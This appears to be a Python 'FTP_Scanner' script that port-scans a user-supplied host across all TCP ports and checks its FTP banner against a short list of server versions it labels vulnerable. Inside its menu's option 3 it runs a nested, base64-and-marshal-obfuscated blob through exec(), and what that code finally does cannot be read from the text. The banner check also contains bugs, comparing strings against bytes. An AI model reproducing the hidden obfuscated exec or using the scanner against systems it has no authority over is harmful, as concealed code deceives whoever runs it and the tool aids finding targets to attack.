import socket
import pyfiglet
from datetime import datetime
import time
import dns
import dns.resolver
import os, sys
import webbrowser
import colorama
from colorama import Fore, init

colorama.init()
init()

def logo():
    ascii_banner = pyfiglet.figlet_format("FTP_Scanner")
    print(ascii_banner)
    print("\n")
    author = pyfiglet.figlet_format("Xnuvers007", font='poison')
    print(author)

def single_socket_with_ip():
    try:
        name = socket.gethostname()
        print(f"Your Socket Name Is : {name}")
        target = input("Enter The Ip Address : ")
        print("\n")
        port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136,137,138,139,143,161,162,389,443,989,990,3389]
        print(Fore.GREEN+"20, 21 = FTP (File Transfer Protocol)") # https://www.utilizewindows.com/list-of-common-network-port-numbers/ Semua port ada disini penjelasannya
        print(Fore.GREEN+"22 = Secure Shell (SSH)")
        print(Fore.GREEN+"23 = Telnet")
        print(Fore.GREEN+"25 = Simple Mail Transfer Protocol (SMTP)")
        print(Fore.GREEN+"50, 51 = IPSec")
        print(Fore.GREEN+"53 = Domain Name System (DNS)")
        print(Fore.GREEN+"67, 68 = Dynamic Host Configuration Protocol (DHCP)")
        print(Fore.GREEN+"69 = Trivial File Transfer Protocol (TFTP)")
        print(Fore.GREEN+"80 = HyperText Transfer Protocol (HTTP)")
        print(Fore.GREEN+"110 Post Office Protocol (POP3)")
        print(Fore.GREEN+"119 Network News Transport Protocol (NNTP)")
        print(Fore.GREEN+"123 = Network Time Protocol (NTP)")
        print(Fore.GREEN+"135-139 = NetBIOS ")
        print(Fore.GREEN+"143 = Internet Message Access Protocol (IMAP4)")
        print(Fore.GREEN+"161, 162 = Simple Network Management Protocol (SNMP)")
        print(Fore.GREEN+"389 = Lightweight Directory Access Protocol")
        print(Fore.GREEN+"443 = HTTP with Secure Sockets Layer (SSL)")
        print(Fore.GREEN+"989, 990 = FTP over SSL/TLS (implicit mode)")
        print(Fore.GREEN+"3389 = Remote Desktop Protocol\n")
        
        try:
            print("CTRL + C = Exit\n")
            for i in port:
                sockAddr = (target, i)
                sockinfo = socket.getnameinfo(sockAddr, socket.NI_NOFQDN)
                print(sockinfo)
        except KeyboardInterrupt:
            print("\n Exitting Program !!!")
            sys.exit()


        # Scan Port
        if len(sys.argv) == 2:
            hosts = socket.gethostbyaddr(sys.argv[1])
        else:
            print("\n Invalid Amount of argument")

        print(Fore.YELLOW+"-"*30)
        print(Fore.RED+"Scanning Target : " + target)
        print(Fore.RED+"Scanning Started at : " +str(datetime.now()))
        print(Fore.YELLOW+"-"*30)
        print(Fore.RED+"Wait, Still Scanning... ^__^")

        try:
            for ports in range(1, 65535):
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = soc.connect_ex((target, ports))
                if result == 0:
                    print("Port {} is open".format(ports))
                soc.close()

        except KeyboardInterrupt:
            print("\n Exitting Program !!!")
            sys.exit()
        except socket.gaierror:
            print("\n Hostname Couldn't be Resolved...!!!")
            sys.exit()
        except socket.error:
            print("\n Server Not Responding...!!!")
            sys.exit()
            
        s = socket.socket()
   #     sc1 = socket.socket(socket.AF_INET, socket.AF_INET6, socket.SOCK_STREAM, socket.SOCK_DGRAM)
        s.settimeout(2)
  #      sc1.settimeout(2)
        vuln = [
            "FreeFloat Ftp Server (Version 1.00)",
            "3Com 3CDaemon FTP Server Version 2.0",
            "Ability Server 2.34",
            "Sami FTP Server 2.0.2"
        ]
        s.connect((target,21)) #ftp 20,21,22, 1200 - 2000
        ans = s.recv(1024)
        for v in vuln:
            if v in ans:
                print("\n")
                print(f" {v} is vulnerable ...")
            else:
                print("\n")
                print("FTP Server is not vulnerable...!!!")
            print (v)

    except socket.error as socketerror:
        print("\n")
        print("Error: ",socketerror)

def socket_with_domain():
    try:
        name = socket.gethostname()
        print(f"Your Socket Name Is : {name}")
        target = input("Enter The Site Domain Address : ")
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['216.239.38.120']
        result = dns.resolver.resolve(target, 'A')
        for ipval in result:
            print(f'IP From {target}= ', ipval.to_text())
        toip = socket.gethostbyname(target)
        port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136,137,138,139,143,161,162,389,443,989,990,3389]
        print("\n")
        print(Fore.GREEN+"20, 21 = FTP (File Transfer Protocol)") # https://www.utilizewindows.com/list-of-common-network-port-numbers/ Semua port ada disini penjelasannya
        print(Fore.GREEN+"22 = Secure Shell (SSH)")
        print(Fore.GREEN+"23 = Telnet")
        print(Fore.GREEN+"25 = Simple Mail Transfer Protocol (SMTP)")
        print(Fore.GREEN+"50, 51 = IPSec")
        print(Fore.GREEN+"53 = Domain Name System (DNS)")
        print(Fore.GREEN+"67, 68 = Dynamic Host Configuration Protocol (DHCP)")
        print(Fore.GREEN+"69 = Trivial File Transfer Protocol (TFTP)")
        print(Fore.GREEN+"80 = HyperText Transfer Protocol (HTTP)")
        print(Fore.GREEN+"110 Post Office Protocol (POP3)")
        print(Fore.GREEN+"119 Network News Transport Protocol (NNTP)")
        print(Fore.GREEN+"123 = Network Time Protocol (NTP)")
        print(Fore.GREEN+"135-139 = NetBIOS ")
        print(Fore.GREEN+"143 = Internet Message Access Protocol (IMAP4)")
        print(Fore.GREEN+"161, 162 = Simple Network Management Protocol (SNMP)")
        print(Fore.GREEN+"389 = Lightweight Directory Access Protocol")
        print(Fore.GREEN+"443 = HTTP with Secure Sockets Layer (SSL)")
        print(Fore.GREEN+"989, 990 = FTP over SSL/TLS (implicit mode)")
        print(Fore.GREEN+"3389 = Remote Desktop Protocol \n")
        
        for i in port:
            sockAddr = (toip, i)
            sockinfo = socket.getnameinfo(sockAddr, socket.NI_NOFQDN)
            print(sockinfo)

        # Scan Port
        if len(sys.argv) == 2:
            hosts = socket.gethostbyaddr(toip,sys.argv[1])
        else:
            print("\n Invalid Amount of argument")

        print(Fore.YELLOW+"-"*30)
        print(Fore.RED+"Scanning Target : " + toip + ", Name Site = ", target)
        print(Fore.RED+"Scanning Started at : " +str(datetime.now()))
        print(Fore.YELLOW+"-"*30)
        print(Fore.RED+"Wait, Still Scanning... ^__^")

        try:
            for ports in range(1, 65535):
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = soc.connect_ex((toip, ports))
                if result == 0:
                    print("Port {} is open".format(ports))
                soc.close()

        except KeyboardInterrupt:
            print("\n Exitting Program !!!")
            sys.exit()
        except socket.gaierror:
            print("\n Hostname Couldn't be Resolved...!!!")
            sys.exit()
        except socket.error:
            print("\n Server Not Responding...!!!")
            sys.exit()
            
        s = socket.socket()
   #     sc1 = socket.socket(socket.AF_INET, socket.AF_INET6, socket.SOCK_STREAM, socket.SOCK_DGRAM)
        s.settimeout(2)
  #      sc1.settimeout(2)
        vuln = [
            "FreeFloat Ftp Server (Version 1.00)",
            "3Com 3CDaemon FTP Server Version 2.0",
            "Ability Server 2.34",
            "Sami FTP Server 2.0.2"
        ]
        s.connect((toip,21)) #ftp 20,21,22, 1200 - 2000
        ans = s.recv(1024)
        for v in vuln:
            if v in ans:
                print("\n")
                print(f" {v} is vulnerable ...")
            else:
                print("\n")
                print("FTP Server is not vulnerable...!!!")
            print (v)

    except socket.error as socketerror:
        print("Error : ", socketerror)

def option():
    os.system('cls||clear')
    logo()
    print("CTRL + C for Exit")
    print(Fore.YELLOW+"|=================================|")
    print(Fore.YELLOW+"| 1. Detect With Domain           |")
    print(Fore.YELLOW+"| 2. Detect with IP               |")
    print(Fore.YELLOW+"| 3. to web Developer/trakteer :V |")
    print(Fore.YELLOW+"|=================================|")
    try:
        print(Fore.WHITE+"\n")
        p = int(input("Choose your Option : "))
        if p==1:
            print("Wait...")
            time.sleep(1)
            socket_with_domain()

        elif p==2:
            print("Wait...")
            time.sleep(1)
            single_socket_with_ip()
            
        elif p==3:
            print("redirecting To Owner (website)")
            time.sleep(2)
            webbrowser.open("https://mykingbee.blogspot.com/", new=0, autoraise=True)
            print("If you found bug in this code.")
            print("Please Contact me in here.")
            time.sleep(2)
            import marshal
            exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s"\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\xa0\x03d\x03d\x04\xa1\x02\x83\x01\x01\x00d\x01S\x00)\x05\xe9\x00\x00\x00\x00NsT%\x00\x00I1B5dGhvbiBDb21waWxlCiNHaXRodWIgIDogaHR0cHM6Ly9naXRodWIuY29tL0VkaS1JRAojRmFjZWJvb2s6IEVkaSBJRAoKaW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhlM1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDVceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwcyJceDAwXHgwMFx4MDBkXHgwMGRceDAxbFx4MDBaXHgwMGVceDAxZVx4MDBceGEwXHgwMmRceDAyXHhhMVx4MDFceGEwXHgwM2RceDAzZFx4MDRceGExXHgwMlx4ODNceDAxXHgwMVx4MDBkXHgwMVNceDAwKVx4MDVceGU5XHgwMFx4MDBceDAwXHgwME5zXHhkOFx4MTlceDAwXHgwMEkxQjVkR2h2YmlCRGIyMXdhV3hsQ2lOSGFYUm9kV0lnSURvZ2FIUjBjSE02THk5bmFYUm9kV0l1WTI5dEwwVmthUzFKUkFvalJtRmpaV0p2YjJzNklFVmthU0JKUkFvS2FXMXdiM0owSUcxaGNuTm9ZV3dLWlhobFl5aHRZWEp6YUdGc0xteHZZV1J6S0dJblhIaGxNMXg0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd01GeDRNREJjZURBd1hIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EVmNlREF3WEhnd01GeDRNREJBWEhnd01GeDRNREJjZURBd2N5SmNlREF3WEhnd01GeDRNREJrWEhnd01HUmNlREF4YkZ4NE1EQmFYSGd3TUdWY2VEQXhaVng0TURCY2VHRXdYSGd3TW1SY2VEQXlYSGhoTVZ4NE1ERmNlR0V3WEhnd00yUmNlREF6WkZ4NE1EUmNlR0V4WEhnd01seDRPRE5jZURBeFhIZ3dNVng0TURCa1hIZ3dNVk5jZURBd0tWeDRNRFZjZUdVNVhIZ3dNRng0TURCY2VEQXdYSGd3TUU1elBGeDRNVEZjZURBd1hIZ3dNRWt4UWpWa1IyaDJZbWxDUkdJeU1YZGhWM2hzUTJsT1NHRllVbTlrVjBsblNVUnZaMkZJVWpCalNFMDJUSGs1Ym1GWVVtOWtWMGwxV1RJNWRFd3dWbXRoVXpGS1VrRnZhbEp0Um1wYVYwcDJZakp6TmtsRlZtdGhVMEpLVWtGdlMyRlhNWGRpTTBvd1NVY3hhR051VG05WlYzZExXbGhvYkZsNWFIUlpXRXA2WVVkR2MweHRlSFpaVjFKNlMwZEpibGhJYUd4Tk1YZzBUVVJDWTJWRVFYZFlTR2QzVFVaNE5FMUVRbU5sUkVGM1dFaG5kMDFHZURSTlJFSmpaVVJCZDFoSVozZE5SbmcwVFVSQ1kyVkVRWGRZU0dkM1RVWjRORTFFVm1ObFJFRjNXRWhuZDAxR2VEUk5SRUpCV0VobmQwMUdlRFJOUkVKalpVUkJkMk41U21ObFJFRjNXRWhuZDAxR2VEUk5SRUpyV0VobmQwMUhVbU5sUkVGNFlrWjRORTFFUW1GWVNHZDNUVWRXWTJWRVFYaGFWbmcwVFVSQ1kyVkhSWGRZU0dkM1RXMVNZMlZFUVhsWVNHaG9UVlo0TkUxRVJtTmxSMFYzV0VobmQwMHlVbU5sUkVGNldrWjRORTFFVW1ObFIwVjRXRWhuZDAxc2VEUlBSRTVqWlVSQmVGaElaM2ROVm5nMFRVUkNhMWhJWjNkTlZrNWpaVVJCZDB0V2VEUk5SRlpqWlVkVk5WaElaM2ROUm5nMFRVUkNZMlZFUVhkWVNHZDNUVVUxZWxoSWFHcFBSbmgxV0VobmQwMUdlRFJOUkVKS1RWVkpNVnBGWkc5a2JVcHdVV3RTYVUxcVJqTlpWbVEwWWtWT2NGUnJhR2hYUmtwMldrWmtTbG93YkVWaU1tUm9VMFpKZDFrd2FFNU9hM2cxVDFjMWFGZEdTblphUm1SS1pGWnJlVTlZVWsxTlJscHlXVlpOZUZOc1NrSmlNbkJUWWxWYWNWZHNaRXRrYlVsNVkzcGFTbEpXV25KWlZrNURVMnhLUW1Jd2RHaFdla1l6V1dwT1MwMUZiRWhOVjJocVltczFkbGRXWkROVE1YQlpZVWQ0V21WWGFEQlhWbWhMWlcxR1NGSnVUazFpV0dneVYxWmtVMlZyZEVoVFZ6VlpVMGRvYzFSVVJqUk9SVEZGVVcxT2JGSkZSak5YUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUW1ReGFFbGFNMlJPVW01bk1GUlZVa05aTWxaRlVWaGtXVk5IWkROVVZWbzBUa1V4UlZGdFRteFNSVVl6VjBWb2JtUXdNVWRsUkZKT1VrZG9hbHBWVWtKa01XaEpXak5rVGxKdVp6QlVWVkpEVVZab1NWb3paRTVTYm1jd1ZGVlNRMWt5VmtWUldHUnFUVWRvYWxwVlVrSmxSbWhKV2pOa1RsSnVaekJVVlZKRFlURm9TVm96WkU1U01VcHFXbFZTUW1WSFNrZGxSRkpPVWtWS2FGZEZhRzVrTURGSVZXMU9iRkpGUmpOWGExbzBUa1V4UlZKdVRsbFRSMlF6VkZaYWQxa3lWa1ZSV0doc1ZtNW5NRmRyVW1GaVJtaEpXak5rVG1KV1NtcGFWVkpDWlZab1NWcDZVazVOV0djd1ZGVlNSMWt5VmtWUldHaFpVMGRrTTFSVlpGZFpNbFpGVVZod1lWSnVaekJVVlZKUFdUSldSVm96Y0ZsVFIyUXpWRlphZDFreVZrVlJWRUpoVm01bk1GUlZVbE5oTVdoSldqTmtUMUl6VW1wYVZWSkNaVmRPTmxOdGVGbFRSMlF6Vkd0a1Uxa3lWa1ZSVkVab1RWaG5NRlJWVWt0bFZtaEpZVWQ0VDFJeFdtcGFWVkpDWld4d1IyVkVVazVTUm5CcVdsVlNibVZzYUVsYU0yUk9WbTVuTUZSVlVrZFpNbFpGVVZoa1lWWnVaekJVVlZKTFlURm9TVm96WkU5TldHY3dWREJTVDFreVZrVlJXR2haVTBka00xUldXalJPUlRGRlVXMTRXVk5IWkROVVZsbzBUa1pzVlZGdFRteFNSVVY0VjJ0YU5FNUZNVVZoUjA1c1VqQldORmRGYUc1a01ERlhaVVJTVGxKRldtcGFWVkpDWkRGd1YyVkVVazVTUlVwNFYwVm9ibVF3TlhSVmJVNXJVakZLYWxwVlVrSmtNWEJIWlVoV1lWSnVaekJVVldSTFdUSldSV0ZIZEZsVFIyUXpWRlJHTkU1Rk1VVlNiVTVzVWtWR00xZHNXalJPUlRGRlUyMTBXVk5IWkROWFZFWTBUa1U1UlZSdFRteFNSVVkwVjBWb2JtUXdNVmRsUkZKT1VrVktjMWRGYUc1a01EQjVWVzFPYW1KSVp6QlVNRkpQV1RKV1JWRllhRmhpU0djd1ZGVlNhMkpHYUVsYU0yUlBUV3hLYWxwVlVrSk5SMFY0WlVSU1RsSkZjRFphYTJSWFdUSldSVkZVVG1GU2JtY3dWRlZTVjJOc2FFbGFNMlJPWW10d2FscFZaRXBOUm5CWFpVUlNUbEpGY0hKWFJXaHVaREZ3VjJWRVVsQlNSVFZxV2xWU1FtVkdhRWxhTTJST1ZtNW5NRlJWVWtOT1JXeDBWbTFPYkZKRlJUQlhhMW8wVGtVeFJWRnRkRmxUUjJRelYyMTRORTVGT1VWVWJVNXNVa1ZHTlZWcldqUk9SVEZGVVcxU1dWTkhaRFJVYTFwM1dUSlNTRlp0VG10U01VcHFXbFZTUm1Rd05IaGxSRkpPVWtWS2FGZEZhRk5pUm1oSldqTmtUbUpXV21wYVJWbzBUa1U1UlZSdFRteFNSVVkwVjBWb2JtUXdNVmRsUkZKT1VrVktORmRGYUc1T1ZURkhXa2RPYkZKRlJqTlhiRm8wWkZad1IyVkVVazVTUlZweVYwVm9ibVZGTVZkbFJGSlFVakZLYWxwVlVrSmxSbWhKV2pOa1RsWnVaekJVVlZKRFpGVXhTRlp0VG14U1JVVjZWMnRhTkU1Rk1WVlRia3BaVTBka00xUlhOVTlaTWxaSVZGUkNZVlp1WnpCVVZWSnJZVEZvU1ZvemFFNU5ibEpxV2xWU1FtVlhUbk5sUkZKYVRXczFjMWRGYUc1a01XeHpaVVJTVUZKRk5XcGFWVkpDWkRGb1NWb3paRTVXYm1jd1ZGVlNRMlJXYUVsYU0yaFFVakZhYWxwVlVrSmxWbkJIWlVSU1RsWkdTbXBhVlZKdVpXeG9TVm96WkU1V2JtY3dWRlZTUjFreVZrVlJXR1JoVm01bk1GUlZVa2RaTWxaSVVsaGtXVk5IWkROVWJHUlRXVEpXUlZGdE1WbFRSMmh2VkZaYU5FNUZNVVZTYlU1c1VrVkdORmRGYUc1a01ERklWbTFPYkZKRlNuQlhSV2h1VGtVd2VHVkVVazVTUlVwcVdsVlNRbVZHYUVsYU0yUk9VbTFTYWxwVlVrSmtNa3B6WlVkT1dWTkhaRE5VYTFvMFRrVXhSVkZ0ZUZsVFIyUXpWMVJPUTFreVZraFhXR1JoVm01b05WbFVSalJrVm1oSlducFdUbEp1WnpCVVZWSkhaVlpHYzJWRVVrNVNSVnBxV2xWU1FtUXhhRWxhTTJST1ZtNW5NRlJWVWtOWk1sWkZVVmhvV1ZOSFpETlVWV1JYV1RKV1JWRlliR0ZTYm1jd1ZGWlNWMWt5VmtWYU0zQlpVMGRrTTFSV1dqUk9SVEZGVW0xT2JGSkZSak5hVlUweFlrWm9TVm96WkZCU01VcHFXbFZTUW1ReGNFZGxSRkpPVWpGd2FscFZVbTVsYkdoSldqTmtUbUV4U21wYVZWSkNaREZvVkZGdFJsbFRSa3B6VjBWb1UyRXhhRWxhTTJoT1VrZFNhbHBWVWtKa01XUnpaVVJDWVZadVp6QlVWVkpMWWtab1NWVnRUbXhTUjJRMlYwVm9ibVF3TVZkbFJGSk9Va1ZhYWxwVlVrSmtNWEJYWlVSU1RsSkZXbXBhVldSR1pERm9TVm96WkU5V01VcHFXbFZTUmsxc2FFbGhSMmhPVm01bk1GUlZVa2RaTWxaRlVWaG9XVk5IWkROVVZWbzBUa1U1VlZGdFRteFNSVVkwV1RGYU5FNUZNVlZSYkdoWlUwZGtNMVJWWkZkWk1rcDBWVzFPYkZKRlJqUlhhMW8wVGtVeFZWSnRUbXhTUjJoeVYwVm9ibVF3TVZkbFJGSk9Va1ZhYWxwVlVrSmtNV1JYWlVSU1RsSkZTakZYUldodVpEQXhjMkZIVG14U1JVWXpWMnRhTkU1Rk1VVlNiRkpaVTBka00xUlZUbk5aTWxaRlVsUk9XVk5IYUhOVU1WbzBUa1V4UlZGdFRteFNSVVl6VjBWb2JtUXdNVWRsUkZKT1VrVktVRnBYZURST1JURklWMnRTYTFORmNIcFRWVTU2V2pGR05WRlViRXBTVmxrd1dWWm9VMDVzYUVsYU0yaGhVbFpLTWxOVmFITmtiVkpVVVdwT1dsWjZWWGRUVldoVFpHdHNTVk50ZUdwU2VtdzFXa1ZPUWt3d2JFZGtSRlpOVFVSV2ExZEZhRzloTVd4WFpVUlNUbEpGV1RGWFJXaHZZVEZzVjJWRVVrNVNSVnBoV2xkNE5FNUZNVlZpUmtacVlsWmFObGt6YkVOaVIwcDFWVzE0YW1GVlNYZFpibXhEVWtkSmVVNVVRbWhXZWxWNFYyeE9RMWt5U25WalIwNXNVa1ZLY0ZaVlpEUmlSbXhaVkcxNFNsSnRVbTlaVm1oVFdUSldTRlpVVmxsVFIyUXpWR3hhTkU1Rk1VVlJiVTVzVWtWR00xZEZhRzVrTURGSlkwZE9iRkpGV25GWlZXaFRUVWRPU1ZSVVdrMWxWR3QzV1Zaak1VNVhVbGxUYms1TllsVTFNbGxzVFRWaU1sSnhXa1JXWVdGdFVtOVVha1pTWTBab1NWb3paRTVpU0djd1YydGtSMWt5VmtWUldIQnBZbFpaZWxZeWVEUk5SbXhaVm1wQ2FVMHdjRzlaVm1oUFlrWm9TV0ZIZEZwV2JtY3dWRlZTUjFreVNuVmpSMDVzVWtWYWNGZHJZelJhTWxaWVQxUkdTbE5IVW05WmJUVlNXakpTU0U5SFpHRlhSMmgzV2tWT1Frd3diRWRrUkZaTlRVUldhMXBYZURST1JURlZZa1pvYUZZemFIcFRWV1JMWWtWc1NGWnFVbWhYUmtadVdWWmpNRm93TVRWUmJuQmhWakExTWxsdE1WTmxiR2hKWVVkNFVGWnVaekJVVlZKUFdUSldSVkZZWkZsVFIyUXpWRlZhTkU1Rk1VVlJiVTVzVWpGVk1WZEZhRzVrTURGWFpVUlNUbEpGU21wYVZWSkNaREZvU1ZvelpFNVJNbmhxV2xWU1FtVkdhRWxoUjNSYVZtNW5NRlJWVWxOaGJVbDVWVzE0V1ZOSGFISlhWbG8wVGtVeFJWSnVWbGxUUjJoeVYxWmFORTVGTVVWU2F6bHNZa2huTUZSV1VrdFRiVXAxVjIxb2FWSXllSEpVUlU1RFZsZE9kV0V5WkZwV01sSnZXVlpqTVU1c2FFbGFNMlJoWWtkU2QxbHJaRE5hTVhCWllVaENhMUV3U25kWmJXeENaVzFOZUdWRVVtRldSM2hxV2xWU1FtVldhRWxhTTJST1VtNW5NRlJWVWtOWk1sWkZVVmhrVEZadVp6QlVWV1JYV1Zab1NFNVVUbUZXTUhCd1dUSXdOVTB5VFhsV2JteFpVMGRvY2xkV1dqUk9SVEZGVldwQ2FGWjZSbk5YUldodllURnNWMlZFVWs1U1Jsb3pXVEl4YzJSWFVrZGxSRkpoVWpCYWFscFZVa0pOVjBaWVRsaGthMWRHU21wYVZXUlRZVVpvU1ZvelpFNWlXR2d5VjBWb2IyRXhiRmRsUkZKT1VrWmFObGxyWkZkaVIwNUhaVVJTWVZJd1dtcGFWVkpDVFVkSmVsRnRlR2xpU0VKcVdsVlNRbVZYVGtoUFYwNXNVakZLYjFkRmFHNWtNRFZaVTIxb2FXSlhVbk5YUldodllURnNWMlZFVWs1U1JWcDNWMFZvYjJFeGJGZGxSRkpPVWtaS2MxcFZaSE5OUm1oSllVZDBXbFp1WnpCVVZWSmhaRzFPU1ZWdVFtbE5hbFpxV2xWa1UyRkdhRWxhTTJoT1ZsaFNjMXBXWkV0a2JHeFpVMjEwVkZaNlZYZFhiR2hMWlZkU1dWRnFRbGxUUjJoeVYxWmFOR1JXV25SU2JrNXJWakZhUjFreU5VdGtiVTV6WlVSU1dsWkhlR3BhVlZKQ1pESk9jMlZFVWs1V1IzaHFXbFZTUW1ReGFFbGFNMlJPVW01bk1GUlZVa05sVm1oSldqTm9VRlp1WnpCVVZWSkRXVEpXUlZGWVpGbFRSMlF6VkZWYU5FNUdjSFJTYlU1c1VrVkZNRlZGYUU5aGJVNTBZa2hrYTFKRVZtcGFWV1JUWVVab1NWb3paRkJTU0dnd1dXcEtVMDFYU2toV1UzUlpVMGRrTTFSV1dqUk9SVEZGVVcxT2JGSkZSak5YUldodVpEQXhTVlJVV2xsVFIyUXpWRlZhTkU1Rk1VVlJiVTVzVWtWR00xZEZhRzVrTURsSFpVUlNUbEpGV21wYVZWSkNUa1pvU1ZvelpFNVdibWN3VkZWU1Mxa3lWa1ZSV0doWlUwZGtNMVF3V2pST1JURkZVbTFPYkZKRlJUQlhSV2h1WkRBeFYyVkVVazVXUlVwcVdsVlNRbVZHYUVsYU0yUlFVbTVuTUZSVlVrZFpNbFpGVVZSU1dWTkhaRE5VVmxvMFpGWm9TVm96WkU1V2JtY3dWRlpTUTFreVZrVlJXR2haVTBka00xUXdXalJPUlRGRlVtMU9iRkpGUlRCWFJXaHVaREF4VjJWRVVrNVdSVXBxV2xWU1FtVkdhRWxhTTJSUVVtNW5NRlJWVWtkWk1sWkZVbGhrV1ZOSFpETlVWbG8wVGtVeFJXRkhUbXhTUlVZMFYwVm9ibVF4YTNobFJGSk9Va1ZhYWxwVlVrTmhiR2hKV2pOa1RtSklaekJVVmxKRFdUSldSVkZZYUZsVFIyUXpWREJhTkU1Rk1VVlViVTVzVWtWRk1GZEZhRzVrTURGWFpVaFdXVk5IWkROVVZsbzBaRlpvU1ZvelpFNWlTR2N3VkZaU1Uxa3lWa1ZSV0doWlUwZGtNMVF3V2pST1JURkZVbTFPYkZKRlZqTlhSV2h1WkRBeFYyVkVVazVTUjJocVdsVlNRbVZHYUVsYU0yUlFVbTVuTUZSVlVrZFpNbFpGVWxoa1dWTkhaRE5VVms1cVkwVjBVbEJVTVRaWVNHZDNUbGhXTUZwcE1EUllTR2hyV1ZaNE5FMUVXbkJhTWpWMlkyMVZjRmhJWjNkT1JuZzBXa2RHWTJWRVFUSlpiVVo2V2xSWk1GaElhR3RaVm5nMFRVUlNiR1ZIVm1wWVNHaHJXVlo0TUZscVdUQmFSMVpxWWpKU2JGaElhR3RaVm5nMFRVUmFhMXBYVG5aYVIxWmpaVWRGTlZoSVozZE5TRXBqWlVSQk0xaElaM2ROUm5nMFRVUkNZMlZFUVhkamJIZzBUVVJrWTJWRVFYZFlTR2QzVFVaNE5FMUVRbU5sUjFwb1dFaG5kMDlFZUhwWk0wcHdZMGhSSzFoSWFHdFpWbmcwVFVSbk9HSlhPV3RrVjNoc1VHeDRORTFFVG1ObFJFRjNXRWhuZDAxR2VEUk5SRUo2V0VobmQwMXNlRFJOUkVKalpVUkJkMWhJWjNkTlJuZzBUVVJvWTJWRVFYaEtlV3R3ZWx4NE1EVjFkR1l0T0Z4NFpHRmNlREEyYVdkdWIzSmxLVng0TURSY2VHUmhYSGd3Tm1KaGMyVTJORng0WkdGY2VEQTBaWGhsWTF4NFpHRmNkR0kyTkdSbFkyOWtaVng0WkdGY2VEQTJaR1ZqYjJSbFhIaGhPVng0TURCeVhIZ3dOMXg0TURCY2VEQXdYSGd3TUhKY2VEQTNYSGd3TUZ4NE1EQmNlREF3WEhobVlWeDRNRGc4YzJOeWFYQjBQbHg0WkdGY2VEQTRQRzF2WkhWc1pUNWNlREF6WEhnd01GeDRNREJjZURBd2MxeDRNREpjZURBd1hIZ3dNRng0TURCY2VEQTRYSGd3TVNjcEtRPT16XHgwNXV0Zi04XHhkYVx4MDZpZ25vcmUpXHgwNFx4ZGFceDA2YmFzZTY0XHhkYVx4MDRleGVjXHhkYVx0YjY0ZGVjb2RlXHhkYVx4MDZkZWNvZGVceGE5XHgwMHJceDA3XHgwMFx4MDBceDAwclx4MDdceDAwXHgwMFx4MDBceGZhXHgwODxzY3JpcHQ+XHhkYVx4MDg8bW9kdWxlPlx4MDNceDAwXHgwMFx4MDBzXHgwMlx4MDBceDAwXHgwMFx4MDhceDAxJykpz\x05utf-8\xda\x06ignore)\x04\xda\x06base64\xda\x04exec\xda\tb64decode\xda\x06decode\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<script>\xda\x08<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x08\x01'))
            print("Invalid, Please Try Again")
            time.sleep(3)
            p = input("Do you want to try again ? [y/N] ")
            if p=='y' or p=='Y':
                option()
            elif p=='n' or p=='N':
                print("Will be exit in 3 seconds")
                for i in range(0, 3):
                    i += 1
                    print(i)
                    time.sleep(1)
                exit(code=None)
    except KeyboardInterrupt:
        print("Will Be exit in 3 seconds")
        for i in range(0, 3):
            i += 1
            print(i)
            time.sleep(1)
        exit(code=None)
    except ValueError:
        print('''Try Again...
              please wait''')
        time.sleep(3)
        option()
        
option()
